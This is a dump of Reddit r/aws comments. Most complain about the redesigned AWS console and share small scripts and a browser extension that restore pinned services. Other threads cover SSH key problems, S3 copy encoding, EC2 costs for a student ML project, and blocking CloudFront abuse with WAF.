g6c4w7p,iy0ibg,"Well, the cronjob triggers a Django management command (this is a django app) which then calls out to an API to download a bunch of data and operate on it in a large pandas dataframe (hence the larger memory requirement). Moving it out of the beanstalk environment would mean I need to somehow duplicate all the security policies and groups to give it access to the RDS instance (which is part of beanstalk) as well as figure out how to run a django management command on an EC2 instance outside of where Django normally lives for my app. Honestly in the future the best solution is to migrate away from elastic beanstalk and build all the infrastructure using RDS/EC2/etc individually but I'm the only developer and not super comfortable with AWS yet so I've shied away from doing that until I feel more confident I can do it without horribly breaking things, since I have a number of paying users who would rightfully be pissed off if I killed their access, accidentally wiped out the database or whatever. It just seemed like for now this would be an easier solution - maybe that's not the case in the end but I feel like I'm getting pretty close to a workable solution at this point so I'm not ready to kill the idea yet lol",1.0
g6a4u2a,ixzfho,"Christ, I can't say how much I hate the direction the new console is going in. Literally everything feels like a step in the wrong direction.

I want more information on a screen and less clicks to get at the information. Not more padding and whitespace.

This is coming from someone who lives in the CLI and doesn't deploy or change a single setting that isn't via CLI/Python+boto3/CloudFormation.

The console UI is a super useful tool to see the results of what you've just deployed, verify configurations, and maybe even learn about the existence of new ones. It's a shame it's getting this treatment.",75.0
g6am11b,ixzfho,"Someone hired a consumer UI designer that does not know their audience is technical people.

Yes, we are hackerman. We work in terminal. We don't need white space, we need information. We will increase zoom or adjust our window size and want word wrap to support that nicely. But the goal is to maximize information and minimize action.

Ffs.",38.0
g6agv7x,ixzfho,"I've sent frequent feedback about whitespacing, padding and wastage of space. I see some services in some regions be better about it than others. eg: Ec2 in eu-c-1 is better than ec2 in us-e-1. SQS is one console that's gotten worse to observe monitoring.  Earlier, the upper part of the console would display lists and the lower part would display it's info and you could navigate between queues from the the top half. Now they're utililzing the entire page for a queue and if I want to check another queue, I have to click multiple times.

TLDR: Number of clicks to get info from the console is something they have neglected in a lot of places in the UI.",9.0
g6avmk2,ixzfho,"Have in mind that the new console look is much, much more mobile friendly. Saved my ass a couple of time while taking a bus drive to work ... before the pandemic ... using CodePipeline.",7.0
g6bofgc,ixzfho,They do not have to change the desktop site at all to make their mobile site more friendly,8.0
g6bop1e,ixzfho,I agree,2.0
g6bbytz,ixzfho,"&gt;Christ, I can't say how much I hate the direction the new console is going in. Literally everything feels like a step in the wrong direction.

Every time i log into some admin portal and see that little ""Do you want to try out our new admin panel beta?"" i think oh fuck they are going to go and screw stuff up.

And sure enough i get like 3 new features and 10 of them become hidden or just removed.

o365, aws, nessus cloud, all of them have some stupid new interface that i just dont honestly have the time to have to relearn everytime they change things.",2.0
g69q8gv,ixzfho,"I complained about this and they told me that they did a user study and those users liked it more. 

I'm not sure where they are finding these users but those users aren't actually using the console frequently.",49.0
g69qk07,ixzfho,"They backing that up? No way they specifically asked or meant the pins. That ribbon at the top is just wasted space now. I agree once you open services tab that looks better. But I want the pins back it's huge.

People should leave feedback and be loud to them if they think this is what users want.",22.0
g69zwxs,ixzfho,"Have you seen the Route53 interface? Less complicated to read yet somehow significantly more complicated and cumbersome to use. EC2 instance listing is similar. I’m glad I mostly use the CLI and SDKs, but when I do need to jump into the console it seems to be getting more and more painful in the prettiest way possible. Yuck.

I leave feedback every chance I get too. I really can’t stress how absolutely horrible the Route53 console is. It’s a massive step backwards.",31.0
g6a9xir,ixzfho,"So... I like SOME parts about it. The fact AWS resources can now be properly aliased and done correctly first try. The fact I can just copy things over via the zone file importer and update accordingly. 

However, it takes 5+ clicks to do something as simple as creating any record. Why do I have to spend 3-4 times as long edit a god damn record. 

The EC2/SG console is the same. I get how it is better, but why do I have to go to a new navigation page to edit something that doesn't even scale to browser display. It looks ugly, performs horribly, and takes longer.",7.0
g6absry,ixzfho,"Yeah, the drop down lists properly populating was nice. Actually, making multiple records for optional answer types (like geo or latency) is nice. Oh god though, the screen loading to do simple things and loss of functionality of the back button infuriates me.

The EC2 console annoys me largely because it’s so spaced out and split into SO MANY tabs. Some don’t even make sense, and some information isn’t where you’d expect it to be. It makes me very sad.",2.0
g6aczzt,ixzfho,"I really want to know who they use for focus groups. Every actual person I have spoken to detests these changes. 

I don't think our rep and his other companies actually use AWS at all. We have had multiple meetings with him giving him an earful of our hatred towards the new consoles. ""Oh? I haven't seen it. I haven't heard any complaints yet either! It must be really bad then..""",3.0
g6add7w,ixzfho,I can only hope that it’s internal and by people that otherwise don’t use the console or understand AWS deeply. If it’s being done by people familiar with the console and use it regularly I would be dumbfounded how it ever got out of mocks.,1.0
g6aades,ixzfho,"Yup I've left feedback specifically for the R53 console as well. I want to be able to add a record to a zone without opening a wizard and requiring multiple windows/clicks. 

Before we could click Add&gt; paste in the prefix and the value and hit create all within the hosted zone screen.",8.0
g6b4r11,ixzfho,"On the other hand, I do like it for creating complex setups, like geolocation or latency based routing I can create without reading the docs on another screen",2.0
g6accdi,ixzfho,Completely agree with you on Route53. They have made it more difficult.,1.0
g6aoxa5,ixzfho,"But you can star your services in dropdown, and they will sppear first there, almost the same, maby one click more",1.0
g6aqybj,ixzfho,"I know. I said twice the clicking every single console Window that I had pinned during navigation would require an extra click for no discernible reason, for the leading company in the world for cloud tech I'd expect better ui decisions than that.",2.0
g6a0v86,ixzfho,Looks like someone preferred UI aesthetics over usability. I hope they revert it,11.0
g69wz5i,ixzfho,"My theory is the UI designers for the console have been told ""make it look pretty, but make it so painful to use that people just go to the CLI"" 👀",17.0
g6a7kbi,ixzfho,Meanwhile SSO launched without API support for the better part of a year!,7.0
g6cbxyt,ixzfho,Still waiting on it for Chatbot too now that's in GA,2.0
g69xaml,ixzfho,Reminds me of Mcsft. settings menu is so dumb now.,2.0
g6a0i93,ixzfho,"I'm having the same problem. The pins meant one mouse movement and one middle-click to open in a new tab (I do this a lot). The new format looks pretty, but it's three mouse movements and three clicks (one to open the menu, one to do the operation, one to get rid of the menu).",10.0
g6a7xg0,ixzfho,Some new guy at the UI job is trying to justify his salary.,16.0
g6as4qd,ixzfho,This should be fairly easy to restore with a browser extension. Just take the favorited services (which are always in the DOM) and drop them into the header with some good css and boom. I can try to do it later this week if no one beats me to it ;),4.0
g6ath5b,ixzfho,"Here, I'll get someone started. Just drop this into a browser developer console when in AWS. If someone can improve this and wrap it into a Browser extension that'd be swell. 

&amp;#x200B;

`var jqry = document.createElement('script');`

`jqry.src = ""`[`https://code.jquery.com/jquery-3.3.1.min.js`](https://code.jquery.com/jquery-3.3.1.min.js)`"";`

`document.getElementsByTagName('head')[0].appendChild(jqry);`

`jQuery.noConflict();`

&amp;#x200B;

`jQuery(""div[data-testid='favorites-container'] li a"").each(function(){`

  `klass = jQuery(""#awsc-nav-header &gt; div:last-child"").attr('class')`

  `div = jQuery(""&lt;div&gt;&lt;/div&gt;"").attr('class', klass)`

  `div.attr('style', 'width:150px;color:white')`

  `div.html(jQuery(this))`

  `jQuery(""#awsc-nav-header &gt; div:first-child"").append(div)`  

`})`",5.0
g6atmhz,ixzfho,[https://imgur.com/a/FkAf60X](https://imgur.com/a/FkAf60X),3.0
g6bf8b3,ixzfho,"    // ==UserScript==
    // @name         AWS Pins
    // @namespace    http://tampermonkey.net/
    // @version      0.1
    // @description  aws stop screwing up the ui
    // @author       me
    // @match        https://*.console.aws.amazon.com/*
    // @grant        none
    // @require      https://code.jquery.com/jquery-3.4.1.min.js
    // ==/UserScript==
    
    (function() {
        window.addEventListener('load', function() {
    
            window.jQuery.noConflict();
            window.jQuery(""div[data-testid='favorites-container'] li a"").each(function(){
    
                var klass = window.jQuery(""#awsc-nav-header &gt; div:last-child"").attr('class')
                var div = window.jQuery(""&lt;div&gt;&lt;/div&gt;"").attr('class', klass)
                div.attr('style', 'width:150px;color:white')
                div.html(window.jQuery(this))
                window.jQuery(""#awsc-nav-header &gt; div:first-child"").append(div)
        })
       }, false);
    })();",3.0
g6bzm8p,ixzfho,"Here is a vanilla JS version, since it threw a JQuery error for me
```
favs = document.querySelector('[data-testid=""favorites-container""]').firstChild  
allLis = favs.getElementsByTagName('li')  
allLis.forEach(li =&gt; {  
 serviceLink = li.firstChild;  
 pin = document.createElement(""div"");  
 pin.className = '_3aKdl69aioTtShsunnqJZ6'  
 pin.append(serviceLink);  
 currHeaderFirstChild = document.getElementById('awsc-nav-header').firstChild;  
 currHeaderFirstChild.append(pin);  
});
```

Thinking of making a `content-script` Chrome extension",1.0
g6de1t5,ixzfho,"Yea it throws a jQuery error for me too, but still works for some reason. In any case, vanilla is good. Post back if you publish the extension. Thanks.",1.0
g6e1ozr,ixzfho,"I have submitted a publish review request for an initial version of the Chrome Extension (might take a few days, said the message)

Meanwhile, I have uploaded my code [here](https://github.com/aravindparappil46/aws-favs-to-pins). It can always use some fine-tuning. Please feel free to share, contribute and make it better :)

Right now, there is just one major bug where I'm not able to get the favorites div occasionally (on refresh sometimes). Will update here once the extension gets published",2.0
g6f7aju,ixzfho,"Glad to announce that the Chrome Extension ""AWS Favorites to Pins"" is now published on the Chrome Web Store! You can find it [here](https://chrome.google.com/webstore/detail/aws-favorites-to-pins/ncldghmgebieadpbefcmhicjepidmnhc/related).

As mentioned above, it was hacked up pretty quick and definitely has some kinks to it. Feel free to contribute to the codebase and I will also try to update it soon.

Drop a rating if you like it!",2.0
g6b4dud,ixzfho,Great plugin for chrome users for shortcuts to favourite AWS services [AWS Sidebar Chrome Extension](https://chrome.google.com/webstore/detail/aws-sidebar/eghlpalflfaopljcglmhoflhfpnngfpe/related) Disappointed as well that they got rid of the pinned tabs!,3.0
g6b9he6,ixzfho,"I kind of feel like I'm the only person that likes the new services menu.

Granted sometimes/often the new console for specific services uses up way more space than it should... but I can live with that. The console is for viewing things, not doing things.

The only thing I want to know is that according to the blog/press release there's now a keyboard short cut to open it, what is it?!",3.0
g6bcay4,ixzfho,"Willing to know too what the shortcut are 
From https://aws.amazon.com/about-aws/whats-new/2020/09/usability-improvements-for-aws-management-console-now-available/
""Depending on your browser support, you can also access the navigation menu items using a keyboard.""",2.0
g6bv0lg,ixzfho,"I also like it. It's so much better organized than the previous menu.

The pins have always been a bad solution for me. They don't sync between devices, are way too wide, and when switching between laptop/external monitor, some items didn't fit anymore.

If you had it set to ""icons only"" you had still had to see the difference between each icon, which is quite subtle.

The star next to each favorited service also really helps memorizing the menu and making the menu look more organized.",2.0
g6awkrl,ixzfho,"It’s actually 3 clicks for me. I use to open a new tab and keep the current tab as is, I need to close the menu to see the content behind.",2.0
g6b8pl7,ixzfho,So I’m not crazy and they were removed! I was wondering why mine just disappeared...,2.0
g6cllgd,ixzfho,"\+1 to bring back the pins ... years and years of the pins has made this a reflex to us  
\#makeawsnavigationgreatagain",2.0
g69z1l9,ixzfho,"The pins weren't accessible for those using screen readers or keyboard navigation, and you could only pin a limited number before running out of screen real-estate.

EDIT: I'm repeating what AWS told me when I asked.",6.0
g6a0o23,ixzfho,"That's no reason to *remove* the ability to pin.

You also have a limited amount of screen-estate in the new Fav list - you have more of it, but it's still limited.",11.0
g69zm2f,ixzfho,"Right, but that still doesn't explain why they removed them or thought it was a good idea to remove them. For 95% of the user base that don't user screen readers. It's no reason to reduce the functionality to the masses. Also since when do any webapps primarily use keyboard nav.",8.0
g6a97m0,ixzfho,"You could use only the icons for the pins. My screen realestate was so huge I could fit in 20-30 services, that was more than enough.",2.0
g6cos6w,ixzfho,"Hello-

I'm a PM from the AWS Management Console. Thank you all for providing feedback on improvement opportunities in the new services menu. We will continue to iterate on the experience and incorporate your feedback. We plan to use the space next to the services menu for new features coming to the AWS Management Console. Please continue to provide your feedback and check out the ‘[What’s New](https://aws.amazon.com/new/?whats-new-content-all.sort-by=item.additionalFields.postDateTime&amp;whats-new-content-all.sort-order=desc&amp;awsf.whats-new-analytics=*all&amp;awsf.whats-new-app-integration=*all&amp;awsf.whats-new-arvr=*all&amp;awsf.whats-new-cost-management=*all&amp;awsf.whats-new-blockchain=*all&amp;awsf.whats-new-business-applications=*all&amp;awsf.whats-new-compute=*all&amp;awsf.whats-new-containers=*all&amp;awsf.whats-new-customer-enablement=*all&amp;awsf.whats-new-customer%20engagement=*all&amp;awsf.whats-new-database=*all&amp;awsf.whats-new-developer-tools=*all&amp;awsf.whats-new-end-user-computing=*all&amp;awsf.whats-new-mobile=*all&amp;awsf.whats-new-gametech=*all&amp;awsf.whats-new-iot=*all&amp;awsf.whats-new-machine-learning=*all&amp;awsf.whats-new-management-governance=*all&amp;awsf.whats-new-media-services=*all&amp;awsf.whats-new-migration-transfer=*all&amp;awsf.whats-new-networking-content-delivery=*all&amp;awsf.whats-new-quantum-tech=*all&amp;awsf.whats-new-robotics=*all&amp;awsf.whats-new-satellite=*all&amp;awsf.whats-new-security-id-compliance=*all&amp;awsf.whats-new-storage=*all)’ for upcoming announcements.

Thanks",2.0
g6eme16,ixzfho,"&gt; We plan to use the space next to the services menu for new features coming to the AWS Management Console

So you're replacing a user controllable shortcut space with... ad space? Wow.",2.0
g6csp9t,ixzfho,"Right?? they removed my color coding by region, and my pins, I already hate the console and try not to use it, but sometimes I need to.... this UI needs to be scraped it's god awful",1.0
g6a5hi8,ixzfho,"You can just use ""Favorites"" and it works **exactly** the same (but less noticable)

Just click the ""services"" drop down &gt; hover over something (e.g. EC2) and an empty star appears next to it &gt; Click it and it'll appear on your left under ""favorites""

EDIT: heres the docs https://docs.aws.amazon.com/awsconsolehelpdocs/latest/gsg/getting-started.html#add-remove-shortcut

EDIT2: downvote me all you want, it's not going to bring back the pin feature. Just get used to it or make a browser extension if you want it that bad.",-5.0
g6aasp7,ixzfho,Not sure why you are getting downvoted unless this is still 2 clicks vs 1... FWIW I'm in the console daily and never noticed this feature.,4.0
g6ab0v5,ixzfho,"Pretty sure it’s just 2 clicks vs 1 is the reason (come on people 2 clicks is better than 5)

Tbh I don’t even care. The pin feature and favorites is still exactly the same thing and I can understand Amazon’s reason to remove it. I remember opening the drop down menu to scroll all the way down for something, only to drag it to the top of the header. So was it a good decision? absolutely.

Not happy with 2+ clicks for a service? I'll do you one better - bookmark the page into your browser people. We're all developers here. Learn to adapt.",1.0
g6becmd,ixzfho,"People on this sub downvote me every time I post this but I seriously think people should check out http://vantage.sh/ who have gripes with the AWS Console. I've been on early access with them for a few months and they've already improved things more than AWS has on their console in years and they take customer feedback very seriously. 

The team is a bunch of former DigitalOcean/AWS employees who are creating an alternative AWS console and its already better in my opinion.",-2.0
g6bkdjk,ixzfho,Is this a SaaS solution or a desktop app?,2.0
g6bomsk,ixzfho,It is a SaaS solution but currently free during early access. There will be a free tier supposedly but they haven't released details of what that covers yet.,0.0
g6bt1gc,ixzfho,I'm not putting AWS Credentials into a third party... That's a non-starter for me,4.0
g6btsb1,ixzfho,They aren't taking AWS credentials. They're using Cross Account IAM roles in a read only manner.,1.0
g6bubtc,ixzfho,I'm less violently opposed to that..,1.0
g6emgrg,ixzfho,Wrong. They said [on this very subreddit](https://www.reddit.com/r/aws/comments/h109wr/show_raws_a_better_aws_console/ftpmqqi/) that they are taking AWS credentials.,1.0
g6fcq6w,ixzfho,Well I don't what to tell you because they aren't doing it any more. It is all cross account IAM Roles.,1.0
g6bpekv,ixzfho,"&gt;http://vantage.sh/

Interesting....",0.0
g69sle7,ixzfho,"Learn how to use the cli.

You can thank me later.",-29.0
g69u543,ixzfho,Can you provide some tips on how I can access and view the Cloudwatch charts and dashboards through the cli? I need usage charts and screenshots and raw JSON data wont cut it. Suggestions? Any free 3rd party services? Just trying to avoid the console ...,7.0
g69yk2w,ixzfho,"That's a case where it sounds like you're either not giving the whole story or are making things more difficult than they need to be. I'd certainly not spin up an extra metrics platform if Cloudwatch does what you need.

The console is looked down upon for infrastructure creation because there's no event register, nor repeatability. I probably wouldn't go nuts creating elaborate Cloudwatch dashboards, but the console is perfectly fine for survey and experimentation",1.0
g6a139e,ixzfho,"The point is that the GP just does their usual ""cli only"" comment whenever anyone complains about the web console, when some tasks are not suitable for the CLI.

Infrastructure changes should be made through code, but that's not all the web console is used for.",10.0
g69u7x0,ixzfho,"I use the cli for powershelling things that I'd repeat. But I administer multiple accounts with multiple scaling groups etc, so I use the console for once off tasks or needing the ui for dashboard and cloudwatch metrics etc. Something the CLI can't do.",4.0
g69x8fu,ixzfho,"Yeah, Console (specifically, interactivity, really...I want to click through, not try to JSON/object parse objects) will always be easiest for one-offs you're unfamiliar with. Not a chance in hell I'm going to be able to find and modify a security group entry in a testing account in the CLI faster than the console through CLI/Boto regardless of my fluency. 

There's certainly a collection of requests for new services where the console interface packages a series of choices you may be unfamiliar with, as well.",4.0
g6a982x,ixzfho,"Not sure why you're being downvoted. You  actually *have to* use the CLI to do lots of things: 

- check pending RDS maintenances
- cancel pending RDS modifications 
- delete Backup recovery points
- list ECS task definitions
- discover IAM friendly names
- fix broken KMS key policies
- finding all the Cloudwatch alarms that send to an SNS topic
- syncing a local path to an s3 bucket
- if you have over 1000 EBS snapshots, the EC2 web console throws an error 

None of this stuff can be done in the web console, and I'm sure that this list is probably far longer than I know. It's either not an option whatsoever or much faster to use the CLI. 

At the same time, the new web UI changes just suck. It was a lot easier having an A-Z listing of services, or not having to click an extra button to get to my resource groups. Don't even get me started on the new EC2 UI or having to use literally any search bar in Systems Manager.",4.0
g6aacrz,ixzfho,Well the console definitely sucks. And there are things that can only be done from the cli. But that is no reason to totally avoid using the console.,3.0
g69uqhh,ixzfho,"Sometimes I think that the people who keep saying use IaC or CLI always instead of the console are people who never really runs any operations. IaC for repetitive things and state management, while console for quickly checking something.",13.0
g6ahtrz,ixzfho,"Or if you're a service provider who inherits the environments and the customer just pays you to keep them running.

One of our customers has a hand-built SQL Server cluster of two i3.8xlarge instances and a few terabytes of io1 that run the backend of a highly trafficked online store.

The cost to make the customer overhaul their development practices and split out the data in this cluster into multiple smaller ones would cost way more than just to keep this monolithic monstrosity running. Many good people have looked at it and we still have the plans ready if they ever want to pull the trigger.",2.0
g6a2ctj,ixzfho,"Or, you know, you build your own internal dashboards that show those things using the API.",-9.0
g6a2ob9,ixzfho,Yeah. Everyone is in luxury for that when a workable solution is already there without any additional effort.,7.0
g6a3coa,ixzfho,If there's a workable solution then why is there a new post in this sub every single day about the console changes?,-11.0
g6a3xno,ixzfho,Because the console is the workable solution....?,4.0
g6a68e6,ixzfho,"Based on this post and many like it, it isn't though.",-4.0
g6aa422,ixzfho,"I said workable solution, not perfect solution. I would rather do few additional clicks than spending months to build and test a new application on top of the console which does almost the same thing.",2.0
g69sy97,ixzfho,I use python and some of my custom libs.  I multi-account,2.0
g6a9job,ixym4m,"I believe in general it's considered good practice to separate Control Plane (the part that controls the job, like Create and Describe APIs) from Data Plane (where the real work happens). If nothing that helps with limiting blast radius when something goes wrong. These planes, usually, scale in different proportions too.",1.0
g69jikz,ixw6cn,have you tried logging into the console with SSM? It doesn't use the key. From there you can update your authorized\_key file to include a new key that you do have.,2.0
g6her00,ixw6cn,Is the image you are using pre configured for key authentication? I know you said Ubuntu was the image but is this an aws store image ?,2.0
g725z42,ixw6cn,the lightsail had a key assigned but I never use it. that instance  exported as image to AWS when turning in ec2 a new key was assigned too. I even made more images from the original lightail and it was the same situation. so still I can't use keys but i can login with password and switch to root,1.0
g69g8lt,ixw6cn,Did you convert the keypair to a putty key with puttygen?,1.0
g6bdi7k,ixw6cn,Yes I change from .pem to ppk,1.0
g6zqime,ixw6cn, I just added the solution. THanks!,1.0
g69jdlq,ixw6cn,"iirc, you need to convert the pem you got from aws to the file format putty wants. I think puttygen is the util. Or you could install wsl and just use native openssh.",1.0
g6bdjjz,ixw6cn,"&gt;Yes I change from .pem to ppk

 Yes I change from .pem to ppk",1.0
g6bm7og,ixw6cn,"And to confirm, you're logging in with the user associated with the key? And it's the key you created originally?",1.0
g6c1lxy,ixw6cn,"Yes i use ubuntu and the ppk key it just say server refuse your key. in lightsail the instance clearly say:  You configured this instance to use **default (us-east-1)** key pair.  whoever that key does not work. 

so i move it to ec2, same key didnt work do I made an image , created a new key and still didnt work for the new image.",1.0
g6ca7et,ixw6cn,"If you've launched an instance and created a key at the same time, and downloaded the key, it's really surprising that it doesn't work. What error are you getting on the ec2 instance?",1.0
g6cgv7s,ixw6cn,"like I said I made this server in early Feb and never used keys only used   the ""connect button"" in lightsail or logged with password.  even the copies of that server are not letting me use key pairs. 

I just made a new ubuntu server and logged with new keys... my fear is I will have to do everything again  and the site is live",1.0
g6cjaqg,ixw6cn,Create an ami of the original server and launch a new instance using that ami and select a key pair that you still have.,1.0
g6zqhov,ixw6cn,that didnt work. I just added the solution. THanks!,2.0
g69g6pn,ixwr1x,"You shouldn't have to do the encodeURI at all - that should be handled automatically.  Just use CopySource: ""/mysourcebucket..."", and make sure it's in double quotes in the params section",2.0
g6bm2h9,ixwr1x,"That's not my experience after quite a bit of testing. Also the docs say ""The value must be URL encoded.""",1.0
g6brjpd,ixwr1x,Params does the URL encoding as per the JavaScript SDK docs.,1.0
g6cghq4,ixwr1x,"It may be doing some encoding, but since `+` in a URL path doesn't get encoded, it's not being handled in a way that actually works with S3.",1.0
g698h8u,ixvqrf,"I'd strongly consider pumping the breaks. 50GB is not that large all things considered, and it sounds like your professors are not giving you good advice.  


c5a.24xlarge  is a very large instance, and it isnt even clear you'd need an ec2.  


Also, you should not be setting up the AWS account. DO NOT USE YOUR CREDIT CARD FOR A COMPANY OR UNIVERSITY PROJECT.   


 c5a.24xlarge is \~$3.69 an hour. If you forget to spin it down an leave it running for 24 hours, thats $88 bucks right there. How about a weekend?  


You need to check if your university has a managed AWS account that can provision you user access and apply costs to your professors project budget. At the very least your professor needs to be owning this more directly.",21.0
g699am7,ixvqrf,"We are using this instance because our model will most likely have the BERT NN which will need a lot of computation power (Hence the 96 cores). Our project is the problem of Twitter engagemnet prediction (Problem description here if you're interested: [http://www.recsyschallenge.com/2020/](http://www.recsyschallenge.com/2020/)). 

We are considering paying and then talking to the university to pay us back...",-3.0
g69ghim,ixvqrf,"&gt; We are considering paying and then talking to the university to pay us back...

Don't front money to multi-million dollar entities you pay. They probably also have some sort of academic arrangement with AWS, such as https://aws.amazon.com/education/ that may get better billing, or they may have existing capacity to use for this.",16.0
g69igdk,ixvqrf,"I agree with Asperoni, you should **NEVER** front money for this. Youll most likely get stiffed. Especially if youre trying to cone to them adter the fact.",5.0
g69w8s6,ixvqrf,"Rule of thumb is-- 10 examples per feature x variability-- will get you going.  Consider modeling with substantially less during experimentation phase.

Once you prove approach then push this into spot instances where it'll be ~80% cheaper",1.0
g69d8yd,ixvqrf,"If you don't need to ever open a support case, you don't need Developer Support. That said, of the $2,698.08 a month you're going to spend on the instance (nevermind storage, bandwidth, etc)... 3% is both a pretty penny, and not that much - depends on perspective.

I'd sanity-check this with your professor, and maybe tone it down a bit. This is an insanely expensive instance for a ""suggest starting with"" starting point.

Or at least use spot instances and interruptable workloads.

Or your own personal PC. You can build a lab box with 192GB RAM and some beefy CPUs for not a whole lot more than you'll be laying out for a month of that compute time.",5.0
g69eou2,ixvqrf,"Thank you for you reply! I'm a little bit confused on how you calculated $2,698.08? Am I still going to be charged if I stop the instance when I go to sleep? My understanding is that I'm only going to be charged for the total amount of time that the instance is running... So for example, if it is running for 10 hours a day, I'm only going to be charged during those 10 hours. Am I wrong?",1.0
g69glvs,ixvqrf,"That's the hourly rate, times 750. Yes, you'll only be billed during your usage, while the instance is in the Running state. 

If your compute can be done over longer stretches of time (that is, you only need to run it 10 hours a day), why go with a $3.69 an hour instance? Let's go with your comment, 10 hours a day and we'll go with 5 days a week. 50 hours a week, 200 hours a month, $738 if your project runs for a month.

If it can be done intermittently, occasionally, or with interruptions please at least look at Spot instances - they're much cheaper. 

Even just 10 hours is $36.90. Not inconsiderable. And you'll be billed for any storage you use, no matter your instance state.",1.0
g69x2g4,ixvqrf,"AWS billing is an area problem with these three costing the same.

- 2 vcores x 2 hrs

- 1 vcores x 4 hrs

- 4 vcores x 1 hr",1.0
g6aflkb,ixvqrf,"It's actually not a problem, in my opinion - Knowing what RAM and compute costs helps in predictability. 

One area of savings, especially for academics, is by not spending as much money for their downtime, or their setup/configuration/experimentation/troubleshooting time. But yeah, if they actually have something so very embarrassingly parallel that it can span 96 vCPUs, multiple NUMA domains, etc and they have their workload up and running every minute the instance is running, then a 24xl makes sense. 

Realistically speaking, the spend on this is way too great for ""my professor thinks we should try this size instance"" without any experience.

They shouldn't bury the needle right away. They've never done this before, and they're paying out of pocket with the hope of reimbursement.",1.0
g69ats5,ixvqrf,"Are you referencing to the Developer Support Plan https://aws.amazon.com/premiumsupport/plans/ ?

If so, you quite likely don't need it... Yes it gives quicker response times and expanded options for support and a few minor benefits, but it doesn't seem to be fitting with such a use case. Even without, you can still spin up the required resources.
These support plans are more intended for those developing/offering platforms/software etc to run on AWS and therefore need immediate technical assistance etc.",3.0
g69kd2i,ixvgek,No NLB,2.0
g6swteq,ixvgek,Thanks for confirming.,1.0
g6rfo10,ixvgek,"Even I was confused with the same while going through Official FAQs. If anyone can confirm regarding this, it would be helpful.

Or 

I used the NLB anyway this month, need to wait until end of month to see the actual bill to confirm. I will update here if this still remains a doubt until then.",1.0
g6ycgpe,ixvgek,"I raised a query with AWS support and there was a confirmation saying that we can use all the three variants of ELB (CLB, ALB, NLB) for a combined total of 750 hours and 15 LCUs (or 15GB for CLB).

Here's the actual answer: "" You can use a combination of the three as long as it is within the limits as set out by the Free Tier promotion. (In order to avoid charges) ""

He also acknowledged that there is a mismatch between Free Tier and FAQs sections.",1.0
g69237p,ixvgek,"It is shared, so you can run either an ALB or ELB for 750 hours (1 AWS billing month). Or you can run an ALB for half the time and an ELB for the other half.
Tho be aware of the other limits like traffic.",1.0
g6swxha,ixvgek,Did you mean CLB instead of ELB? That's good to know. I've been playing around with ALB and CLB too. I guess I'll be careful with NLB.,1.0
g691861,ixv6a8,"If it’s not public knowledge, anyone who does know will be under an NDA, so you’re unlikely to get any information here.",8.0
g69306m,ixv6a8,"This.  
Most, if not all, corporations having access to AWS's roadmap is bound by a NDA.

The best would be to reach them out directly by email or twitter :)",4.0
g693kgq,ixv6a8,Ask your TAM for a roadmap.,5.0
g69b269,ixv6a8,"Do you need any specific features of Aurora Postgres as opposed to RDS Postgres?

https://aws.amazon.com/about-aws/whats-new/2020/03/amazon-rds-now-supports-postgresql-12/",3.0
g69klqw,ixv6a8,Talk to your rep. You’ll need to sign an NDA.,1.0
g6b0433,ixv6a8,"Thanks for the comments, we're waiting for the response of our TAM.",1.0
g69bcdm,ixv6a8,Postgres is the red headed step child of RDS.  Calling it an afterthought compared to MySQL is being generous.  Don’t get your hopes up,-6.0
g6b09cw,ixv6a8,"Honestly, I feel that more mature and polite comments should be allowed. Furthermore, we are not in control of what dependencies an application is choosing so we want to do our best in order to be compliance with security and releases.",1.0
g692ije,ixuyb0,Try building the package on ec2 amazon linux.. that's more interactive way to find missing dependencies,4.0
g69wyyn,ixuyb0,"I use a few layers from here, looks like he's got one for OpenCV - hope it helps 

https://github.com/keithrozario/Klayers",2.0
g691dho,ixuyb0,"Am guessing there are platform specific needs from a computer vision library, and lambda function authors have to heed architecture specifics.  If you know the lambda cpu arch, maybe you can build the libs in a docker container of that arch and then deploy.",1.0
g68va1z,ixufi8,Rhel if ur only comparing those two,3.0
g692jsd,ixufi8,"Yup. Redhat is something I see as the Linux equal to Windows Server. Impressive native tape drive support, a sensible GUI, big industry basing popular distros like CentOS (Free), Amazon Linux 2, and Oracle Linux on RH.  
  
I myself like Ubuntu as a fun Desktop. Redhat is for serious server stuff. This is where you'll be making money.",2.0
g69uu8t,ixufi8,Would there be a better Linux certification outside of these two that you could suggest?,1.0
g68ucsa,ixufi8,"RHCSA is practical so I’d go with that. If you’re just interested in quickly getting a certification for the job search I’d go for Linux+ since it’s vendor neutral and possibly easier to obtain. Neither is super devops focused though, so a chef, puppet, or ansible cert would probably serve you better if such things exist.",2.0
g6e3ta2,ixufi8,RH certification goes all the way to a Linux Architect Certification.,1.0
g8226w3,ixufi8,"When deciding on what certs to get, there are some points that I think are worth considering:

* Is it in demand? I have the RHCSA and it was in much more demand than Linux+. But I wouldn't even say that RHCSA is even in demand anymore. Systems are being architected to be more ephemeral and in the cloud now, so if an OS broke, you can just replace it now or rollback to an earlier version. 
* Difficulty- RHCSA is more difficult than Linux+ so getting it implies that you know Linux+ too.
* Implications- As above, some certs imply that you know other topics. For example, CKAD/CKA implies you know Docker so no point in getting a Docker cert. AWS SAA implies you know what's covered in the AWS CCP exam etc.  


Also, you can always just study the cert material and not get the cert. I personally see no reason not to get RHCSA, even though I think it's no longer in demand, because it's a great way to assess your skill and it still looks good.",1.0
g691jir,ixufi8,"I work as Devops but everyone I’ve seen who works in devops has come from developer or system admin side of things with years of experience. I don’t think devops is meant to be an entry level role. At least in my job, you’re required to have knowledge in a lot of topics and be hands on",1.0
g68ppnl,ixt6b9,"It’s not Google, per-se. Looks like some random person has shared a URL on your site on Google+. 


https://support.google.com/webmasters/thread/34525120?hl=en",5.0
g68q0ly,ixt6b9,"Ok, blocking it then. Thanks!",1.0
g68r77g,ixt6b9,"Adding WAF would be good in my opinion.
Do you forward headers to origin too by any chance? If yes, you might want to limit the type of headers that can be forwarded like host",2.0
g692nfw,ixt6b9,I'm using WAF now to block everything except my CDN IP addresses. But this persistent Google Bot just won't let up.,1.0
g6bwjzv,ixt6b9,"I think you can also filter by host header to only allow specific host header request as some requests may come with a different host header to try bypass some security.

https://aws.amazon.com/premiumsupport/knowledge-center/waf-block-http-requests-no-user-agent/",1.0
g6cxh5u,ixt6b9,"The IP block is working just fine. There's only 8 IP addresses from the CDN that should be accessing those endpoints, and I have them whitelisted. Following the KISS principle works just fine.",2.0
g69ag5e,ixt6b9,What was the original problem?,2.0
g69o8tw,ixt6b9,"Our bandwidth usage is about 700GB per month on average. We're sitting at 4.46TB for this month. 

Some app creator managed to find a hole in our CloudFront security, and thought ""I can run a streaming video service and not have to maintain a video archive!"" 

